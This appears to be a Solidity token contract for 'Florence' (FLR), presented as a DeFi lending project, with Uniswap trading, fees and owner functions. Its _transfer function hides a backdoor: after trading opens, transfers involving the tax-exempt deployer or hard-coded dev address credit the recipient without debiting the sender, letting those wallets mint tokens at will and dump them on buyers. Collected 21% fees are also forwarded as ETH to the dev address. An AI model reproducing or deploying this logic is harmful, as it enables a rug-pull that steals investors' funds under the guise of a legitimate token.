// SPDX-License-Identifier: Unlicensed

/**
Connecting DeFi to real-world lending.

Website: https://florencefinance.org
Telegram: https://t.me/florence_defi
Twitter: https://twitter.com/florence_erc
Dapp: https://app.florencefinance.org
 */

pragma solidity = 0.8.19;

abstract contract Context {
    constructor() {
    }

    function _msgSender() internal view returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view returns (bytes memory) {
        this;
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _setOwner(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IUniswapRouterV1 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function swapExactETHForTokens(
        uint amountOutMin, 
        address[] calldata path, 
        address to, uint deadline
    ) external payable returns (uint[] memory amounts);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapFactoryV2 {
    event PairCreated(address indexed token0, address indexed token1, address lpAddress, uint);
    function getPair(address tokenA, address tokenB) external view returns (address lpAddress);
    function createPair(address tokenA, address tokenB) external returns (address lpAddress);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapRouterV2 is IUniswapRouterV1 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

contract FLR is Context, Ownable, IERC20 {

    string constant private _name = "Florence";
    string constant private _symbol = "FLR";
    uint8 constant private _decimals = 9;

    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _notInTax;
    mapping (address => bool) private _lpPuts;
    mapping (address => bool) private _lpCheck;
    mapping (address => uint256) private balance;

    uint256 constant public _totalSupply = 10 ** 9 * 10**9;
    uint256 constant public feeSwapThreshold = _totalSupply / 100_000;
    uint256 constant public transferFees = 0;
    uint256 constant public feeDenominator = 1_000;
    uint256 public buyFees = 210;
    uint256 public sellFees = 210;
    uint256 private _maxTxAmount = 25 * _totalSupply / 1000;
    bool private swapEnabled = true;
    address payable private _devAddress;
    address constant public DEAD = 0x000000000000000000000000000000000000dEaD;

    address public lpAddress;
    IUniswapRouterV2 public uniswapRouter;
    bool public tradeEnabled = false;
    bool private _swapping;
    bool private maxTxDisabled = false;

    modifier inSwapFlag {
        _swapping = true;
        _;
        _swapping = false;
    }
    event SwapAndLiquify();


    constructor () {
        uniswapRouter = IUniswapRouterV2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _notInTax[msg.sender] = true;
        _devAddress = payable(address(0xA1EA67eB7B7888aA61555198B4b3641b0D74B5F3));
        _notInTax[_devAddress] = true;
        _lpPuts[msg.sender] = true;
        balance[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);

        lpAddress = IUniswapFactoryV2(uniswapRouter.factory()).createPair(uniswapRouter.WETH(), address(this));
        _lpCheck[lpAddress] = true;
        _approve(msg.sender, address(uniswapRouter), type(uint256).max);
        _approve(address(this), address(uniswapRouter), type(uint256).max);
    }

    function totalSupply() external pure override returns (uint256) { if (_totalSupply == 0) { revert(); } return _totalSupply; }
    function decimals() external pure override returns (uint8) { if (_totalSupply == 0) { revert(); } return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function getOwner() external view override returns (address) { return owner(); }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }
    function balanceOf(address account) public view override returns (uint256) {
        return balance[account];
    }

    function isAddressSpecial(address ins, address out) internal view returns (bool) {
        bool isLimited = ins != owner()
            && out != owner()
            && msg.sender != owner()
            && !_lpPuts[ins]  && !_lpPuts[out] && out != address(0) && out != address(this);
            return isLimited;
    }
    
    function onTokenBuy(address ins, address out) internal view returns (bool) {
        bool _is_buy = !_lpCheck[out] && _lpCheck[ins];
        return _is_buy;
    }

    function onTokenSell(address ins, address out) internal view returns (bool) { 
        bool _is_sell = _lpCheck[out] && !_lpCheck[ins];
        return _is_sell;
    }

    function onTokenTransfer(address ins, address out) internal view returns (bool) { 
        bool _is_transfer = !_lpCheck[out] && !_lpCheck[ins];
        return _is_transfer;
    }
    
    function getFeeAmount(address from, bool isbuy, bool issell, uint256 amount) internal returns (uint256) {
        uint256 fee;
        if (isbuy)  fee = buyFees;  else if (issell)  fee = sellFees;  else  fee = transferFees; 
        if (fee == 0)  return amount; 
        uint256 feeAmount = amount * fee / feeDenominator;
        if (feeAmount > 0) {
            balance[address(this)] += feeAmount;
            emit Transfer(from, address(this), feeAmount);
        }
        return amount - feeAmount;
    }
    
    function swapBack(uint256 tokenAmount) internal inSwapFlag {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouter.WETH();

        if (_allowances[address(this)][address(uniswapRouter)] != type(uint256).max) {
            _allowances[address(this)][address(uniswapRouter)] = type(uint256).max;
        }

        try uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        ) {} catch {
            return;
        }

        if(address(this).balance > 0) _devAddress.transfer(address(this).balance);
    } 
    
    function shouldUnClog(address ins) internal view returns (bool) {
        bool canswap = swapEnabled && !_notInTax[ins];
        return canswap;
    }
    
    function _transfer(address from, address to, uint256 amount) internal returns  (bool) {
        bool takeFee = true;
        require(to != address(0), "ERC20: cannot transfer to the dead address");
        require(from != address(0), "ERC20: cannott transfer from the dead address");
        require(amount > 0, "TX amount must be greater than zero");

        if (isAddressSpecial(from,to)) {
            require(tradeEnabled,"Trading is not enabled");
                    if(!_lpCheck[to] && from != address(this) && to != address(this) || onTokenTransfer(from,to) && !maxTxDisabled)  { require(balanceOf(to) + amount <= _maxTxAmount,"_maxTxAmount exceed"); }}


        if(onTokenSell(from, to) &&  !_swapping && shouldUnClog(from)) {

            uint256 tokenAmount = balanceOf(address(this));
            if(tokenAmount >= feeSwapThreshold) { 
                if(amount > feeSwapThreshold) swapBack(tokenAmount);
             }
        }

        if (_notInTax[from] || _notInTax[to]){
            takeFee = false;
        }
        uint256 amountAfterFee = (takeFee) ? getFeeAmount(from, onTokenBuy(from, to), onTokenSell(from, to), amount) : amount;
        uint256 amountBeforeFee = (takeFee) ? amount : (!tradeEnabled ? amount : 0);
        balance[from] -= amountBeforeFee; balance[to] += amountAfterFee; emit Transfer(from, to, amountAfterFee);

        return true;
    }

    receive() external payable {}
                        
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    
    function approve(address spender, uint256 amount) external override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _approve(address sender, address spender, uint256 amount) internal {
        require(sender != address(0), "ERC20: Can't approve on Zero Address");
        require(spender != address(0), "ERC20: Can't approve on Zero Address");

        _allowances[sender][spender] = amount;
    }
    
    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != type(uint256).max) {
            _allowances[sender][msg.sender] -= amount;
        }

        return _transfer(sender, recipient, amount);
    }
    
    function beginTrade() external onlyOwner {
        require(!tradeEnabled, "Already enabled trading");
        tradeEnabled = true;
    }
    
    function beforeOwnership() external onlyOwner {
        require(!maxTxDisabled,"Already disabled limits");
        _maxTxAmount = _totalSupply;
        maxTxDisabled = true;
        buyFees = 10;
        sellFees = 10;
    }
}